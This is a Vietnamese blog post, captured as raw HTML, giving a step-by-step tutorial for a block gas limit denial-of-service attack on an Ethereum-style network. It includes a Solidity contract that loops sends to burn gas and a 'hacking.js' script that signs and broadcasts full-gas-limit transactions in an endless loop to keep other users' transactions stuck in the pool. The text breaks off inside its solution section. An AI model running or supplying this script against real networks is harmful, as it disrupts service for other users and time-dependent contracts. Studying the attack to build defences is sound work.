<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="Block gas limit attack" /><meta property="og:locale" content="en" /><meta name="description" content="Blockchain Attack: Block gas limit attack Blog này hướng dẫn chi tiết sử dụng kĩ thuật DoS with Block gas limit (đã nhắc tới trong bài smart contract best practice 3) để tấn công 1 mạng blockchain." /><meta property="og:description" content="Blockchain Attack: Block gas limit attack Blog này hướng dẫn chi tiết sử dụng kĩ thuật DoS with Block gas limit (đã nhắc tới trong bài smart contract best practice 3) để tấn công 1 mạng blockchain." /><link rel="canonical" href="https://imduchuyyy.github.io/posts/block-gas-limit-attack/" /><meta property="og:url" content="https://imduchuyyy.github.io/posts/block-gas-limit-attack/" /><meta property="og:site_name" content="imduchuyyy" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-27T10:20:30+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Block gas limit attack" /><meta name="twitter:site" content="@imduchuyyy" /><meta name="google-site-verification" content="WjaSzRel73OVQ7YfleqYO87Nm4jrGcuP5hF7zwxRjJ4" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-08-19T11:07:13+08:00","datePublished":"2021-07-27T10:20:30+08:00","description":"Blockchain Attack: Block gas limit attack Blog này hướng dẫn chi tiết sử dụng kĩ thuật DoS with Block gas limit (đã nhắc tới trong bài smart contract best practice 3) để tấn công 1 mạng blockchain.","headline":"Block gas limit attack","mainEntityOfPage":{"@type":"WebPage","@id":"https://imduchuyyy.github.io/posts/block-gas-limit-attack/"},"url":"https://imduchuyyy.github.io/posts/block-gas-limit-attack/"}</script><title>Block gas limit attack | imduchuyyy</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="imduchuyyy"><meta name="application-name" content="imduchuyyy"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://euc.li/imduchuyyy.eth" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">imduchuyyy</a></div><div class="site-subtitle font-italic">Huy's home is on the internet.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/imduchuyyy" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/imduchuyyy" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['imduchuyyy','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Block gas limit attack</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Block gas limit attack</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> imduchuyyy </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Jul 27, 2021, 10:20 AM +0800" >Jul 27, 2021<i class="unloaded">2021-07-27T10:20:30+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Aug 19, 2023, 10:07 AM +0700" >Aug 19, 2023<i class="unloaded">2023-08-19T11:07:13+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1151 words">6 min read</span></div></div><div class="post-content"><h1 id="blockchain-attack-block-gas-limit-attack">Blockchain Attack: Block gas limit attack</h1><p>Blog này hướng dẫn chi tiết sử dụng kĩ thuật DoS with Block gas limit (đã nhắc tới trong bài <a href="https://bui-duc-huy.github.io/posts/smart-contract-best-practice-3/#dos-with-block-gas-limit">smart contract best practice 3</a>) để tấn công 1 mạng blockchain.</p><h2 id="preparation">Preparation</h2><p>Trước khi bắt đầu tấn công mạng, ta cần tìm hiểu về blockchain network. Tìm hiểu về endpoint blockchain, luật đồng thuận, block struct của mạng và nhiều thứ khác.</p><p>Trước tiên về network: nắm rõ luật đồng thuận của mạng (ở bài post này sẽ tấn công mạng ethereum sử dụng luật đồng thuận <code class="language-plaintext highlighter-rouge">Proof of Work</code>)</p><p>Về <strong>Block Struct</strong>, bài post sử dụng cách thức tấn công <code class="language-plaintext highlighter-rouge">block gas limit</code> nên trước tiên sẽ tìm hiểu về thông số block gas limit của mạng.</p><p>Tìm hiểu về cách thức block được tạo ra và cách các transaction được đưa vào trong block.</p><p>Trên sẽ là các kiến thức nền tảng của blockchain cần biết trước khi bắt đầu vào thức hiện cuộc tấn công này.</p><p>Trước tiên ta cần set up folder cho toàn bộ script để thực hiện việc tấn công</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">mkdir </span>block_gas_limit_attack
<span class="nb">cd </span>block_gas_limit_attack
</pre></table></code></div></div><h2 id="get-block-gas-limit">Get Block Gas Limit</h2><p>Với cuộc tấn công block gas limit, trước tiên ta sẽ tìm thông số block gas limit của mạng (sử dụng <code class="language-plaintext highlighter-rouge">javascript</code> và thư viện <code class="language-plaintext highlighter-rouge">web3</code>)</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>npm <span class="nb">install </span>web3
vim getGasLimit.js
</pre></table></code></div></div><p>Thực hiện kết nối web3 với network:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">Web3</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">web3</span><span class="dl">"</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">web3Provider</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Web3</span><span class="p">.</span><span class="nx">providers</span><span class="p">.</span><span class="nc">HttpProvider</span><span class="p">(</span><span class="dl">"</span><span class="s2">network endpoint</span><span class="dl">"</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">web3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Web3</span><span class="p">(</span><span class="nx">web3Provider</span><span class="p">)</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">web3</span><span class="p">)</span>
</pre></table></code></div></div><p>Lấy ra lastest block của mạng để kiểm tra tình trạng kết nối cũng như xem các thông số của block:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">async</span> <span class="kd">function</span> <span class="nf">getLastestBlock</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">block</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nf">getBlock</span><span class="p">(</span><span class="dl">"</span><span class="s2">latest</span><span class="dl">"</span><span class="p">)</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">block</span><span class="p">)</span>
<span class="p">}</span>

<span class="nf">getLastestBlock</span><span class="p">()</span>
</pre></table></code></div></div><p>Nhận được kết quả trả về:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="o">{</span>
    number: 2074747,
    <span class="nb">hash</span>: <span class="s1">'0xa587aa3b79e249fa13a799b700287a9a13f0aaeb90b5bdb59f019511a91a5843'</span>,
    mixHash: <span class="s1">'0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365'</span>,
    parentHash: <span class="s1">'0xb043c80558a303a6a6cff54ee12cb4c0c18d7d6c6d9875ca357ef792afee4aab'</span>,
    nonce: <span class="s1">'0x0000000000000000'</span>,
    sha3Uncles: <span class="s1">'0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347'</span>,
    logsBloom: <span class="s1">'0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>,
    transactionsRoot: <span class="s1">'0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421'</span>,
    stateRoot: <span class="s1">'0xba29682e080d946de3d793b6d146cb3f9001f1ce6e4b088b7f2eb9e94707bc5e'</span>,
    receiptsRoot: <span class="s1">'0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421'</span>,
    miner: <span class="s1">'0x20f41061b59cdD1de39862dac8420Cde5B1C4611'</span>,
    difficulty: <span class="s1">'1'</span>,
    totalDifficulty: <span class="s1">'2074748'</span>,
    extraData: <span class="s1">'0xf90148a00000000000000000000000000000000000000000000000000000000000000000f854941e3415214147f480c4a82130fa2fc75f870799499420f41061b59cdd1de39862dac8420cde5b1c4611942de1ec20190935f197f83dfcb5c49b424d1f78e594adb2d82c0247ee35774840e95313b6330e199605808400000000f8c9b8419f92d5c3c7ded5ab0b91e29829e7473a36ec4b9fa99929feb4b48891571f2a8f104383eddac4c1d14a6c73c070af96dbedeb4d2843c900cc0c79677750e4879800b8415d8987fd2229dc77fdc84e559055e59e38293ffaac01f72015979ed27707fa4b2e6bcdf55b381cbb214d8730b7afa7fc22cf768e10428c1b251e815809d22ff900b841591a9516ccc936a1f45e787e5b99e608d83249c64eb18ff2a22a9c59f1a27b0c633ea0ead2660f1c7e7c7bf76edf821029e121719096eae1740981eb4e2f9c9601'</span>,
    size: 845,
    gasLimit: 1890884448,
    gasUsed: 0,
    timestamp: 1627361583,
    uncles: <span class="o">[]</span>,
    transactions: <span class="o">[]</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Đã thấy thông số <code class="language-plaintext highlighter-rouge">gasLimit</code> của block là <code class="language-plaintext highlighter-rouge">1890884448</code></p><p>Để thực hiện Block Gas Limit Attack, như đã được nhắc tới trong bài Smart Contract Best Practice, chúng ta thức hiện việc gửi transaction tới network với lượng gas sử dụng xấp xỉ gas limit của block để chặn các transaction khác được thực thi - đây gọi là DoS with Block gas limit.</p><h2 id="set-up-truffle">Set up Truffle</h2><p>Thực hiện việc gửi transaction với mức gas cao xấp xỉgas limit của block cách dễ nhất là sử dụng 1 custom smart contract thực hiện vòng lặp gửi token tới nhiều address trong 1 lời gọi hàm</p><p>Bắt đầu việc viết và test smart contract với <code class="language-plaintext highlighter-rouge">truffle</code></p><div class="language-sh highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>truffle unbox metacoin
</pre></table></code></div></div><p>Connect truffle đến blockchain network</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="c1">// truffle-config.js</span>
<span class="kd">const</span> <span class="nx">PrivateKeyProvider</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">@truffle/hdwallet-provider</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">privateKey</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">private key</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">privateKeyProvider</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PrivateKeyProvider</span><span class="p">(</span><span class="nx">privateKey</span><span class="p">,</span> <span class="dl">"</span><span class="s2">RPC-URL</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">networks</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">development</span><span class="p">:</span> <span class="p">{</span>
            <span class="na">provider</span><span class="p">:</span> <span class="nx">privateKeyProvider</span><span class="p">,</span>
            <span class="na">host</span><span class="p">:</span> <span class="dl">"</span><span class="s2">node_host</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">port</span><span class="p">:</span> <span class="dl">"</span><span class="s2">node_port</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">network_id</span><span class="p">:</span> <span class="dl">"</span><span class="s2">chain_id</span><span class="dl">"</span><span class="p">,</span>
        <span class="p">},</span>
    <span class="p">};</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Thử việc deploy smart contract mẫu đến network</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>truffle migrate
</pre></table></code></div></div><h2 id="write-smart-contract">Write Smart Contract</h2><p>Viết 1 smart contract thực hiện chuyển token cho nhiều địa chỉ khác nhau, và sẽ sử dụng hết <code class="language-plaintext highlighter-rouge">1890884448</code> gas của 1 block trong 1 transaction</p><p>Tạo smart contract để thực hiện việc tấn công</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">cd </span>contracts/
vim Transfer.sol
</pre></table></code></div></div><p>Code 1 contract đơn giản thực hiện việc chuyển token</p><pre><code class="language-solidity">pragma solidity &gt;=0.4.25 &lt;0.7.0;

contract Transfer {
    address payable private owner;

    constructor() public {
        owner = msg.sender;
    }

    function transfer(uint number) public {
        for (uint x; x &lt; number; x++) {
            owner.send(1);
        }
    }
}
</code></pre><p>Deploy contract lên network</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c1">// migrations/1_initial_migration.js</span>
<span class="kd">const</span> <span class="nx">Transfer</span> <span class="o">=</span> <span class="nx">artifacts</span><span class="p">.</span><span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">Transfer</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">deployer</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">deployer</span><span class="p">.</span><span class="nf">deploy</span><span class="p">(</span><span class="nx">Transfer</span><span class="p">)</span>
<span class="p">};</span>
</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>truffle deploy
</pre></table></code></div></div><p>Chuyển 1 lượng token vừa đủ tới smart contract để thực hiện hacking</p><h2 id="start-hacking">Start Hacking</h2><p>Viết script thực hiện gọi hàm transfer của smart contract</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>vim hacking.js
</pre></table></code></div></div><div class="language-javascript highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">network_endpoint</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">network-endpoint</span><span class="dl">"</span>
<span class="kd">const</span> <span class="nx">address</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">address</span><span class="dl">"</span>
<span class="kd">const</span> <span class="nx">privateKey</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">privateKey</span><span class="dl">"</span>
<span class="kd">const</span> <span class="nx">networkId</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">4444</span><span class="dl">"</span>
<span class="kd">const</span> <span class="nx">gasLimit</span> <span class="o">=</span> <span class="mi">1890884448</span>

<span class="kd">const</span> <span class="nx">Web3</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">web3</span><span class="dl">"</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">web3Provider</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Web3</span><span class="p">.</span><span class="nx">providers</span><span class="p">.</span><span class="nc">HttpProvider</span><span class="p">(</span><span class="nx">network_endpoint</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">web3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Web3</span><span class="p">(</span><span class="nx">web3Provider</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">Transfer</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">./build/contracts/Transfer.json</span><span class="dl">"</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">contract</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nc">Contract</span><span class="p">(</span><span class="nx">Transfer</span><span class="p">.</span><span class="nx">abi</span><span class="p">,</span> <span class="nx">Transfer</span><span class="p">.</span><span class="nx">networks</span><span class="p">[</span><span class="nx">networkId</span><span class="p">].</span><span class="nx">address</span><span class="p">)</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nf">hack</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">accounts</span><span class="p">.</span><span class="nx">wallet</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nx">privateKey</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">tx</span> <span class="o">=</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">methods</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="mi">1000000</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">tx</span><span class="p">.</span><span class="nf">encodeABI</span><span class="p">();</span>
    <span class="kd">let</span> <span class="nx">nonce</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nf">getTransactionCount</span><span class="p">(</span><span class="nx">address</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">signedTx</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">accounts</span><span class="p">.</span><span class="nf">signTransaction</span><span class="p">(</span>
            <span class="p">{</span>
                <span class="na">to</span><span class="p">:</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">options</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span>
                <span class="nx">data</span><span class="p">,</span>
                <span class="na">gas</span><span class="p">:</span> <span class="nx">gasLimit</span><span class="p">,</span>
                <span class="na">gasPrice</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="nx">nonce</span><span class="p">,</span>
                <span class="na">chainId</span><span class="p">:</span> <span class="nx">networkId</span>
            <span class="p">},</span>
            <span class="nx">privateKey</span>
        <span class="p">);</span>

        <span class="nx">nonce</span><span class="o">++</span><span class="p">;</span>
        <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nf">sendSignedTransaction</span><span class="p">(</span><span class="nx">signedTx</span><span class="p">.</span><span class="nx">rawTransaction</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nf">hack</span><span class="p">()</span>
</pre></table></code></div></div><p>Sau khi gọi hàm thì có thể hàm thực thi đã fail trên blockchain network nhưng đã làm cho block bị sử dụng toàn bộ <code class="language-plaintext highlighter-rouge">gas</code> khiến các transaction khác đên trong thời điểm này sẽ nằm trong pool mãi mãi cho đến khi các miner thực hiện mở rộng <code class="language-plaintext highlighter-rouge">blockSize</code></p><h2 id="conclusion">Conclusion</h2><p>DDoS, là từ chối dịch vụ, chiếm hữu tài nguyên, kẻ tấn công sẽ thực hiện các request để chiếm hữu tài nguyên, lỗi này xảy ra sẽ làm cho hệ thống của mình bị nghẽn, không thể phục vụ user bình thường, blockchain cũng có lỗi này, khi lỗi này xảy ra sẽ làm tắc nghẽn khả năng xử lý của một node trong mạng.</p><p>Lỗi <code class="language-plaintext highlighter-rouge">blockGasLimit</code> sẽ làm giảm hiệu năng và khả năng xử lý của 1 node trong mạng blockchain, mặc dù các miner có thể điều chỉnh <code class="language-plaintext highlighter-rouge">gasLimit</code> của một block để có thể khác phục lỗi này, nhưng điểu này có thể làm gia tăng phí gas và bùng nổ dữ liệu, nên các miner sẽ rất cân nhắc việc tăng <code class="language-plaintext highlighter-rouge">blockSize</code>.</p><p>Lỗi này cũng gây chậm trễ transaction của các user, điều này thực sự nguy hiểm đối với các smart contract yêu cầu logic về thời gian, vì trong thời gian hacker thực hiện ddos blockchain network, user không thể thực hiện các logic liên quan tới thời gian của mình.</p><h2 id="solution">Solution</h2><p>Mặc dù với các bản cập nhập của Ethereum, các lỗi này đã cơ bản được khắc phục bẳng cách các miner sẽ tự động tăng <code class="language-plaintext 